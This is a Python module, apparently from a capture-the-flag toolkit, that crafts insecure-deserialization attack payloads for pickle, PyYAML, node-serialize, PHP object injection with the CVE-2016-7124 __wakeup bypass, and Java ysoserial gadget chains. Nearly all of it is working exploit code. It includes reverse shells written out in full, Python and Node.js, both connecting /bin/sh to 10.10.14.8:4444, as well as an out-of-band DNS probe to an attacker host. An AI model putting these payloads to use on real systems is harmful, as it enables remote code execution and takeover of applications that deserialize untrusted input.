"""
Advanced Insecure Deserialization RCE Crafter for WebCTF Suite.
Supports Python (Pickle, PyYAML), Node.js (node-serialize),
PHP (Object Injection / POP Chains / CVE-2016-7124), and Java gadget formats.
"""

import pickle
import base64
import os
import subprocess
from typing import Dict, List, Any, Optional

# ─── PYTHON PICKLE CRAFTER ─────────────────────────────────────────────
class _PickleSystem:
    def __init__(self, cmd: str):
        self.cmd = cmd
    def __reduce__(self):
        return (os.system, (self.cmd,))

class _PicklePopen:
    def __init__(self, cmd: str):
        self.cmd = cmd
    def __reduce__(self):
        return (subprocess.Popen, (["/bin/sh", "-c", self.cmd],))

def generate_pickle_payload(cmd: str = "id", mode: str = "system") -> Dict[str, Any]:
    """
    Generate Python pickle deserialization payload with multiple weaponization modes.
    Modes: 'system', 'popen', 'rev' (reverse shell)
    """
    if mode == "popen":
        p_obj = _PicklePopen(cmd)
    else:
        p_obj = _PickleSystem(cmd)

    raw_bytes = pickle.dumps(p_obj)
    b64_str = base64.b64encode(raw_bytes).decode()
    hex_str = raw_bytes.hex()
    
    # Python one-liner reverse shell pickle generator
    rev_py = f"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.8',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
    rev_obj = _PickleSystem(f"python3 -c \"{rev_py}\"")
    rev_b64 = base64.b64encode(pickle.dumps(rev_obj)).decode()

    return {
        "Base64 Payload": b64_str,
        "Hex Payload": hex_str,
        "Raw Length": len(raw_bytes),
        "Command": cmd,
        "Reverse Shell Base64": rev_b64,
        "Explanation": f"Executes '{cmd}' via pickle.loads() unpacking using {mode} reduction."
    }

# ─── PYYAML DESERIALIZATION CRAFTER ────────────────────────────────────
def generate_pyyaml_payload(cmd: str = "id") -> Dict[str, str]:
    """Generate PyYAML unsafe load RCE payloads across different constructors."""
    payloads = {
        "os.system": f"!!python/object/apply:os.system [\"{cmd}\"]",
        "subprocess.Popen": f"!!python/object/apply:subprocess.Popen [[\"/bin/sh\", \"-c\", \"{cmd}\"]]",
        "subprocess.check_output": f"!!python/object/apply:subprocess.check_output [[\"/bin/sh\", \"-c\", \"{cmd}\"]]",
        "builtins.exec": f"!!python/object/apply:builtins.exec [\"import os; os.system('{cmd}')\"]",
    }
    return {
        "PyYAML Payloads": payloads,
        "Default Payload": payloads["subprocess.Popen"],
        "Command": cmd,
        "Explanation": "Executes command when passed to yaml.load() or yaml.unsafe_load()."
    }

# ─── NODE.JS NODE-SERIALIZE CRAFTER ────────────────────────────────────
def generate_nodejs_serialize_payload(cmd: str = "id", ip: str = "10.10.14.8", port: int = 4444) -> Dict[str, Any]:
    """Generate Node.js node-serialize IIFE RCE & Reverse Shell payloads."""
    js_cmd = f"_$$ND_FUNC$$_function (){{ require('child_process').exec('{cmd}', function(error, stdout, stderr) {{ console.log(stdout) }}); }}()"
    json_cmd = f'{{"rce":"{js_cmd}"}}'
    
    # Node.js socket reverse shell
    js_rev = f"_$$ND_FUNC$$_function (){{ var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var client=new net.Socket();client.connect({port},'{ip}',function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}}); }}()"
    json_rev = f'{{"rce":"{js_rev}"}}'

    return {
        "Raw JSON Command Payload": json_cmd,
        "Base64 Command Payload": base64.b64encode(json_cmd.encode()).decode(),
        "Raw JSON Reverse Shell": json_rev,
        "Base64 Reverse Shell": base64.b64encode(json_rev.encode()).decode(),
        "Command": cmd,
        "Explanation": "Immediately Invoked Function Expression (IIFE) executed during node-serialize unserialize()."
    }

# ─── PHP OBJECT INJECTION & POP GADGETS ─────────────────────────────────
def generate_php_serialized_object(class_name: str, properties: Dict[str, Any], bypass_wakeup: bool = False) -> str:
    """
    Construct a raw PHP serialized string for arbitrary classes and properties.
    Supports CVE-2016-7124 (__wakeup bypass by incrementing property count).
    """
    actual_count = len(properties)
    prop_count = actual_count + 1 if bypass_wakeup else actual_count
    
    body = ""
    for k, v in properties.items():
        # Key serialization
        body += f's:{len(k)}:"{k}";'
        # Value serialization
        if isinstance(v, str):
            body += f's:{len(v)}:"{v}";'
        elif isinstance(v, int):
            body += f'i:{v};'
        elif isinstance(v, bool):
            body += f'b:{1 if v else 0};'
        else:
            v_str = str(v)
            body += f's:{len(v_str)}:"{v_str}";'

    serialized = f'O:{len(class_name)}:"{class_name}":{prop_count}:{{{body}}}'
    return serialized

def get_php_unserialize_tips() -> List[Dict[str, str]]:
    """Common PHP magic methods and object injection techniques."""
    return [
        {
            "Magic Method": "__destruct()",
            "Trigger": "Called automatically when object is destroyed (end of script execution).",
            "Use Case": "Most common gadget entry point for file deletion, file write, or log execution."
        },
        {
            "Magic Method": "__wakeup()",
            "Trigger": "Called immediately when unserialize() is invoked.",
            "Use Case": "Re-initializing database connections or properties."
        },
        {
            "Magic Method": "__toString()",
            "Trigger": "Called when object is treated as a string (e.g. echo $obj, string formatting).",
            "Use Case": "Commonly triggers file_get_contents(), eval(), or preg_replace() sink."
        },
        {
            "Magic Method": "__get() / __set()",
            "Trigger": "Called when reading or writing inaccessible/undefined properties.",
            "Use Case": "Property hijacking in multi-stage gadget chains."
        },
        {
            "Magic Method": "CVE-2016-7124 (__wakeup Bypass)",
            "Trigger": "Set property count header to higher than actual count (e.g. O:4:\"User\":2:{} with 1 prop).",
            "Use Case": "Completely bypasses __wakeup() execution in PHP 5 < 5.6.25 and PHP 7 < 7.0.10."
        },
        {
            "Magic Method": "Phar Deserialization Trigger",
            "Trigger": "file_exists('phar://exploit.phar'), is_dir(), file_get_contents(), etc.",
            "Use Case": "Triggers PHP deserialization on metadata without calling unserialize() explicitly."
        }
    ]

# ─── JAVA DESERIALIZATION GADGET TEMPLATES ─────────────────────────────
def get_java_deserialization_templates(cmd: str = "id") -> List[Dict[str, str]]:
    """Common Java Ysoserial gadget chains and execution templates."""
    b64_cmd = base64.b64encode(cmd.encode()).decode()
    return [
        {
            "Gadget Chain": "CommonsCollections1-7",
            "Dependency": "commons-collections:commons-collections:3.1 / 4.0",
            "Trigger": "BadAttributeValueExpException / LazyMap / TransformedMap",
            "Ysoserial Command": f"java -jar ysoserial.jar CommonsCollections6 '{cmd}' | base64"
        },
        {
            "Gadget Chain": "Spring1 / Spring2",
            "Dependency": "org.springframework:spring-core:4.1.4.RELEASE",
            "Trigger": "MethodInvokeTypeProvider / PropertyPathFactoryBean",
            "Ysoserial Command": f"java -jar ysoserial.jar Spring1 '{cmd}' | base64"
        },
        {
            "Gadget Chain": "URLDNS (Blind SSRF / OOB Probe)",
            "Dependency": "Standard JDK (Zero Dependencies)",
            "Trigger": "HashMap.readObject() -> URL.hashCode() -> DNS Lookup",
            "Ysoserial Command": f"java -jar ysoserial.jar URLDNS 'http://attacker-burpcollab.net' | base64"
        },
        {
            "Gadget Chain": "CommonsBeanutils1",
            "Dependency": "commons-beanutils:1.9.2, commons-logging:1.2",
            "Trigger": "BeanComparator.compare() -> PropertyUtils.getProperty() -> TemplatesImpl.getOutputProperties()",
            "Ysoserial Command": f"java -jar ysoserial.jar CommonsBeanutils1 '{cmd}' | base64"
        }
    ]
